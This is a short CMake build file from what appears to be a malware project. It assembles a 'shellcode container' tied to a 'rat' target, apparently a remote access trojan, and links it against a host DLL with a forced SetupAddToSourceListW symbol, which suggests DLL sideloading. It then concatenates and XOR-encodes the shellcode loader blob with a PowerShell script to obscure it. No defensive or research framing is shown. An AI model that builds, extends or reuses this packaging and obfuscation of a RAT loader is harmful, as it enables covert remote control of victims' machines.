# Shellcode container
add_pic(shellcode entry.cpp shellcode.hpp)

if(SHELLCODE_STUB_RAT)
  set(RAT rat-stub)
  message(STATUS "Using rat stub for shellcode build")
else()
  set(RAT rat)
endif()

add_dependencies(shellcode ${RAT})
target_link_libraries(shellcode-pe PRIVATE ${RAT}-header ${RAT_HOST_DLL}.lib)
target_link_options(shellcode-pe PRIVATE /INCLUDE:SetupAddToSourceListW)
target_include_directories(shellcode-pe PRIVATE ${CMAKE_SOURCE_DIR}/include)

add_custom_target(
    shellcode-blob
    DEPENDS
        ${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/shellcode-blob.bin
)

add_custom_command(
    OUTPUT
        $<CONFIG>/shellcode-blob.bin
    COMMAND
        cmake.exe -E cat ${PROJECT_SOURCE_DIR}/data/shellcode-prefix.txt $<TARGET_PROPERTY:shellcode,SOURCES> > shellcode-blob.bin
    COMMAND
        powershell.exe -file "${CMAKE_SOURCE_DIR}/tools/xor_file.ps1" -key "${RESOURCE_XOR_KEY_HEX}" -infile shellcode-blob.bin -outfile shellcode-blob.bin.xor
    WORKING_DIRECTORY
        ${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>
    DEPENDS
        $<TARGET_PROPERTY:shellcode,SOURCES> 
    COMMENT
        "Building and XOR-encoding shellcode loader blob"
)